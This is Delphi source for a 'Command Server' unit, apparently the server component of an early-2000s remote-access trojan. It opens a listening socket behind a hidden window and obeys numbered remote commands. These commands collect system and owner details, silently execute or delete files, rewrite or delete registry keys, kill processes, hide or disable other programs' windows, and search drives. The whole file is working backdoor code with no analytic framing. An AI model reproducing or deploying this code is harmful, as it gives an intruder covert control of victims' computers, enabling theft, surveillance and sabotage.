unit ServerPart1;

interface

Uses
 Windows, Winsock, Messages, Unit1, WinInet, ShellApi;

const
 cOsUnknown = 'Unknown';
 cOsWin95    = 'Win95';
 cOsWin98    = 'Win98';
 cOsWin98SE  = 'Win98SE';
 cOsWinME    = 'WinME';
 cOsWinNT    = 'WinNT';
 cOsWin2000  = 'Win2k';
 cOsXP       = 'WinXP';
 ServerClass = '0x0F0';
 BUFLEN = 65536;
 SM_CONNECT = WM_USER+156;
 SM_SOCKET = WM_USER+157;

Var
 ServerMsg1             : String = 'Command Server. Compiled : 2004/02/15'#13;

 ASiz                   : LongInt;
 CServ2                 : TSocket;
 SRIC2                  : Boolean;
 Connected2             : Boolean;
 Buf2k                  : Array[0..BufLEN-1] of Char;

 Inst                   : Hwnd;
 wClass                 : TWndClass;
 MainWin                : HWND;
 wsData                 : WSADATA;
 Serv1                  : TSocket;
 SockAddrIn             : SockAddr_in;
 RemoteSockAddr         : pSockAddr;
 RemoteSockAddrLen      : pInteger;
 Msg                    : TMsg;

 BSiz                   : LongInt;
 SocketReadIsCaller     : Boolean;
 Connected              : Boolean;
 Buf                    : Array[0..BUFLEN-1] of Char;

 Procedure Server1(Port:Integer);
 Procedure SocketRead1(Str:String);

implementation

Function GetNet:String;
Var
 S:Dword;
Begin
 S := INTERNET_CONNECTION_LAN;
 If InternetGetConnectedState(@S ,0) Then
  If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
   Result := 'LAN';
 S := INTERNET_CONNECTION_MODEM;
 If InternetGetConnectedState(@S ,0) Then
  If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
   Result := 'Dial-up';
End;

function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := cOsUnknown;
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := cOsWinNT
          else if (majorVer = 5) and (minorVer = 0) then
            Result := cOsWin2000
          else if (majorVer = 5) and (minorVer = 1) then
            Result := cOsXP
          else
            Result := cOsUnknown;
        end; 
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin 
          if (majorVer = 4) and (minorVer = 0) then
            Result := cOsWin95
          else if (majorVer = 4) and (minorVer = 10) then
          begin 
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := cOsWin98SE
            else
              Result := cOsWin98; 
          end
          else if (majorVer = 4) and (minorVer = 90) then 
            Result := cOsWinME
          else
            Result := cOsUnknown;
        end;
      else
        Result := cOsUnknown;
    end;
  end
  else
    Result := cOsUnknown;
end;

Function WReceive1: String;
Var
 Str, Res : ShortString;
 Tmp : Cardinal;
 Label Z;
Begin
 Str := '';
 Res := '';
 Tmp := GetTickCount;
 Repeat
Z:
  bSiz := Recv(CServ1, Str[1], 255, 0);
  If bSiz = -1 Then Begin
   bSiz := wsaGetLastError;
   If bSiz = WSAEWOULDBLOCK Then Begin
    If SocketReadIsCaller Then Begin
     Res := 'e!'#13;
     Break;
    End;
    Continue;
   End Else
    Break;
  End;
  SetLength(Str, bSiz);
  Res := Res + Str;
  If Not Connected Then Break;
  If Tmp + 40000 <= GetTickCount Then Break;
  If Res = '' Then Goto Z;
  Until Res[Length(Res)] = #13;
 SetLength(Res, Length(Res)-1);
 Result := Res;
End;

function IntToStr(X: integer): string;
var
 S: string;
begin
 Str(X, S);
 Result := S;
end;

Procedure SocketRead1(Str:String);
Var
 FindFiles_Thread:DWord;
 Str2    : ShortString;
 An,
 Cmd,
 Param  : String;
 tmp1,tmp2,tmp3,tmp4,tmp5:string;
Begin
 If Str = '' Then Begin
  SocketReadIsCaller := True;
  Str2 := WReceive1;
  SocketReadIsCaller := False;
 End Else Str2 := Str;

 Cmd := Copy(Str2, 1, 2);
 Param := Copy(Str2, 3, Length(Str2));

 // !! VERSION
 If Cmd = '10' Then Begin
  An := cmd+'1.0'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! OS
 If Cmd = '11' Then Begin
  An := cmd+GetOs+#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! NET-INFO
 If Cmd = '12' Then Begin
  An := cmd+GetNet+#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! COMPUTER INFO
 If Cmd = '13' Then Begin
  If (GetOs = 'WinXP') or (GetOs = 'Win2k') or (GetOs = 'WinNT') Then Begin
   An := Cmd+'CurrentBuild : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'CurrentBuild');
   An := An + #13 + Cmd  + 'CurrentBuildNumber : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'CurrentBuildNumber');
   An := An + #13 + Cmd  + 'CurrentType : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'CurrentType');
   An := An + #13 + Cmd  + 'CurrentVersion : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'CurrentVersion');
   An := An + #13 + Cmd  + 'PathName : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'PathName')+#13;
   Send(CServ1, An[1], Length(An), 0);
  End Else Begin
   An := Cmd+'CurrentBuild : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'CurrentBuild');
   An := An + #13 + Cmd  + 'CurrentBuildNumber : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'CurrentBuildNumber');
   An := An + #13 + Cmd  + 'CurrentType : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'CurrentType');
   An := An + #13 + Cmd  + 'CurrentVersion : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'CurrentVersion');
   An := An + #13 + Cmd  + 'PathName : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'PathName')+#13;
   Send(CServ1, An[1], Length(An), 0);
  End;
 End;
 // !! SERVER INFO
 If Cmd = '14' Then Begin
  An := Cmd + 'Server Path : '+ParamStr(0);
  An := An + #13 + Cmd + 'SIN : Yes'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! USER INFO
 If Cmd = '15' Then Begin
  If (GetOs = 'WinXP') or (GetOs = 'Win2k') or (GetOs = 'WinNT') Then Begin
   An := Cmd  + 'ProductID : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductID');
   An := An + #13 + Cmd  + 'ProductName : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName');
   An := An + #13 + Cmd  + 'RegisteredOrganization : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOrganization');
   An := An + #13 + Cmd  + 'RegisteredOwner : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOwner')+#13;
   Send(CServ1, An[1], Length(An), 0);
  End Else Begin
   An := Cmd  + 'ProductID : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'ProductID');
   An := An + #13 + Cmd  + 'ProductName : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'ProductName');
   An := An + #13 + Cmd  + 'RegisteredOrganization : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOrganization');
   An := An + #13 + Cmd  + 'RegisteredOwner : ' + GetRegValue(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOwner')+#13;
   Send(CServ1, An[1], Length(An), 0);
  End;
 End;
 // !! WIN/SYSDIR
 If Cmd = '16' Then Begin
  An := cmd+'SysDir : '+Sysdir+#13;
  Send(CServ1, An[1], Length(An), 0);
  Sleep(70);
  An := cmd+'WinDir : '+Windir+#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! TRANSFER-PORT
 If Cmd = '17' Then Begin
  An := cmd + GetSettings(1)+#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! UPTIME
 If Cmd = '18' Then Begin
  An := cmd + 'Uptime : '+UpTime + #13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! REFRESH
 If Cmd = '19' Then Begin
  SaveFile(RefreshList(Param), (Sysdir + '\FILE.LST'));
  An := '21FILE.LST'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! DELETE FILE
 If Cmd = '22' Then Begin
  If DeleteFile(pChar(Param)) Then
   An := cmd+'Y' Else An := Cmd+'N';
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! EXECUTE FILE
 If Cmd = '23' Then Begin
  If ShellExecute(0, 'open', pChar(Param), NIL, NIL, 0) = ERROR_SUCCESS Then
   An := cmd+'Y' Else An := Cmd+'N';
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! REFRESH REG
 If Cmd = '24' Then Begin
  tmp1 := copy(param, 1, pos(':', param)-1);
  tmp2 := copy(param, pos(':', param)+1, length(param));
  If Tmp1 = 'HKEY_CLASSES_ROOT' then
   SaveFile(ReadRegEdit(HKEY_CLASSES_ROOT, Tmp2, 0), (Sysdir + '\FILE.LST'));
  If Tmp1 = 'HKEY_CURRENT_USER' then
   SaveFile(ReadRegEdit(HKEY_CURRENT_USER, Tmp2, 0), (Sysdir + '\FILE.LST'));
  If Tmp1 = 'HKEY_LOCAL_MACHINE' then
   SaveFile(ReadRegEdit(HKEY_LOCAL_MACHINE, Tmp2, 0), (Sysdir + '\FILE.LST'));
  If Tmp1 = 'HKEY_USERS' then
   SaveFile(ReadRegEdit(HKEY_USERS, Tmp2, 0), (Sysdir + '\FILE.LST'));
  If Tmp1 = 'HKEY_CURRENT_CONFIG' then
   SaveFile(ReadRegEdit(HKEY_CURRENT_CONFIG, Tmp2, 0), (Sysdir + '\FILE.LST'));

  An := '24FILE.LST'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! DELETE KEY
 if Cmd = '25' Then Begin
  tmp1 := copy(param, 1, pos(':', param)-1);
  tmp2 := copy(param, pos(':', param)+1, length(param));
  tmp3 := copy(tmp2, pos(':', tmp2)+1, length(tmp2));
  tmp2 := copy(tmp2, 1, pos(':', tmp2)-1);
  If Tmp1 = 'HKEY_CLASSES_ROOT' then
   DeleteRegKey(HKEY_CLASSES_ROOT, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_CURRENT_USER' then
   DeleteRegKey(HKEY_CURRENT_USER, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_LOCAL_MACHINE' then
   DeleteRegKey(HKEY_LOCAL_MACHINE, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_USERS' then
   DeleteRegKey(HKEY_USERS, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_CURRENT_CONFIG' then
   DeleteRegKey(HKEY_CURRENT_CONFIG, Tmp2, Tmp3);

  An := '25'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! DELETE VALUE
 if Cmd = '26' Then Begin
  tmp1 := copy(param, 1, pos(':', param)-1);
  tmp2 := copy(param, pos(':', param)+1, length(param));
  tmp3 := copy(tmp2, pos(':', tmp2)+1, length(tmp2));
  tmp2 := copy(tmp2, 1, pos(':', tmp2)-1);
  If Tmp1 = 'HKEY_CLASSES_ROOT' then
   DeleteRegValue(HKEY_CLASSES_ROOT, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_CURRENT_USER' then
   DeleteRegValue(HKEY_CURRENT_USER, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_LOCAL_MACHINE' then
   DeleteRegValue(HKEY_LOCAL_MACHINE, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_USERS' then
   DeleteRegValue(HKEY_USERS, Tmp2, Tmp3);
  If Tmp1 = 'HKEY_CURRENT_CONFIG' then
   DeleteRegValue(HKEY_CURRENT_CONFIG, Tmp2, Tmp3);

  An := '26'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! SET VALUE
 If Cmd = '27' then begin
  tmp1 := copy(param, 1, pos(':', param)-1);
  tmp2 := copy(param, pos(':', param)+1, length(param));
  tmp3 := copy(tmp2, pos(':', tmp2)+1, length(tmp2));
  tmp4 := copy(tmp3, pos(':', tmp3)+1, length(tmp3));
  tmp3 := copy(tmp3, 1, pos(':', tmp3)-1);
  tmp2 := copy(tmp2, 1, pos(':', tmp2)-1);

  If Tmp1 = 'HKEY_CLASSES_ROOT' then
   SetRegValue(HKEY_CLASSES_ROOT, Tmp2, Tmp3, tmp4);
  If Tmp1 = 'HKEY_CURRENT_USER' then
   SetRegValue(HKEY_CURRENT_USER, Tmp2, Tmp3, tmp4);
  If Tmp1 = 'HKEY_LOCAL_MACHINE' then
   SetRegValue(HKEY_LOCAL_MACHINE, Tmp2, Tmp3, tmp4);
  If Tmp1 = 'HKEY_USERS' then
   SetRegValue(HKEY_USERS, Tmp2, Tmp3, tmp4);
  If Tmp1 = 'HKEY_CURRENT_CONFIG' then
   SetRegValue(HKEY_CURRENT_CONFIG, Tmp2, Tmp3, tmp4);

  An := '27'#13;
  Send(CServ1, An[1], Length(An), 0);

 End;

 // !! UPDATE PROCESS
 If Cmd = '29' Then Begin
  SaveFile(LISTPROC, (Sysdir+'PROC.LST'));
  An := '24PROC.LST'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;

 // !! CLOSE PROCESS
 If Cmd = '30' Then Begin
  KillProc(Param);
  An := '30'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;

 // !! REFRESH WINDOWS
 If Cmd = '31' Then Begin
  SaveFile(GETWINS, (Sysdir+'WINS.LST'));
  An := '24WINS.LST'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! CHANGE CAPTION
 If Cmd = '32' Then Begin
  Tmp1 := Copy(Param, 1, pos(':', Param)-1);
  Tmp2 := Copy(Param, Pos(':', Param)+1, Length(Param));
  SetWindowText(StrToInt(Tmp1), pChar(Tmp2));
  An := '32'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! HIDE WINDOW
 If Cmd = '33' Then Begin
  ShowWindow(StrToInt(Param), 0);
  An := '34'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! SHOW WINDOW
 If Cmd = '34' Then Begin
  ShowWindow(StrToInt(Param), 1);
  An := '34'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! DISABLE WINDOW
 If Cmd = '35' Then Begin
  EnableWindow(StrToInt(Param), False);
  An := '35'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! ENABLE WINDOW
 If Cmd = '36' Then Begin
  EnableWindow(StrToInt(Param), True);
  An := '36'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! CANCEL CURRENT
 If Cmd = '37' Then Begin
  Cancel_Transfer := True;
  An := '37'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! FIND FILES
 If Cmd = '38' Then Begin
  If Already_Searching Then Cancel_Search := True;
  Sleep(200);
  SearchFor := Copy(Param, 1, length(Param));
  SearchHDD := Copy(SearchFor, 1, Pos('\', SearchFor));
  SearchFor := Copy(SearchFor, pos('\', SearchFor)+1, Length(SearchFor));
  Cancel_Search := False;
  Already_Searching := True;
  CreateThread(NIL, 0, @FindFile, NIL, 0, FindFiles_Thread);
  An := '38'#13;
  Send(CServ1, An[1], Length(An), 0);
 End;
 // !! GET DRIVERS
 If Cmd = '39' Then Begin
  An := GetDriver;
  Send(CServ1, An[1], Length(An), 0);
 End;

End;

Function ServerProc1 (Win:Hwnd; Mess:Word; Wpr:Word; Lpr:LongInt):LongInt;Stdcall;
Begin
 Result := 0;
 Case mess Of
  SM_CONNECT: Begin
               If Connected Then Exit;
               RemoteSockAddrLen^ := SizeOf(RemoteSockAddr^);
               CServ1 := Accept(Serv1, RemoteSockAddr, RemoteSockAddrLen);
               wsaAsyncSelect(CServ1, MainWin, SM_SOCKET, FD_READ or FD_CLOSE);
               Connected := True;
               Exit;
              End;
  SM_SOCKET : Begin
               Case LoWord(Lpr) Of
                FD_READ: SocketRead1('');
                FD_CLOSE: Begin
                           Connected := False;
                           Exit;
                          End;
               End;
              End;
  WM_CLOSE  : Begin
               PostQuitMessage(0);
               ExitProcess(0);
              End;
  WM_DESTROY: Begin
               PostQuitMessage(0);
               ExitProcess(0);
              End;
  WM_QUIT   : Begin
               ExitProcess(0);
              End;
  End;
 Result := DefWindowProc(Win, Mess, Wpr, Lpr);
End;

Procedure Server1(Port:Integer);
begin

  Inst := GetModuleHandle(NIL);

  With wClass Do Begin
    Style := CS_CLASSDC or CS_PARENTDC;
    lpfnWndProc := @ServerProc1;
    hInstance := Inst;
    hbrBackGround := Color_BtnFace + 1;
    lpszClassname := ServerClass;
    hCursor := LoadCursor(0, IDC_ARROW);
  End;

  RegisterClass(wClass);

  MainWin := CreateWindow(ServerClass, NIL, 0, 0, 0,
             GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
             0, 0, Inst, NIL);

  WSAStartUp($0101, wsData);

  Serv1 := Socket(PF_INET, SOCK_STREAM, IPPROTO_IP);
  SockAddrIn.Sin_Family := PF_INET;
  SockAddrIn.Sin_Addr.S_Addr := INADDR_ANY;
  SockAddrIn.Sin_Port := hTons(Port);
  Bind(Serv1, SockAddrIn, SizeOf(SockAddrIn));
  Listen(Serv1, 1);
  wsaAsyncSelect(Serv1, MainWin, SM_CONNECT, FD_ACCEPT);
  GetMem (RemoteSockAddr, SizeOf(RemoteSockAddr));
  GetMem (RemoteSockAddrLen, SizeOf(RemoteSockAddrLen));
  While GetMessage(Msg, 0, 0, 0) Do Begin
    DispatchMessage(Msg);
    TranslateMessage(Msg);
  End;
end;

end.
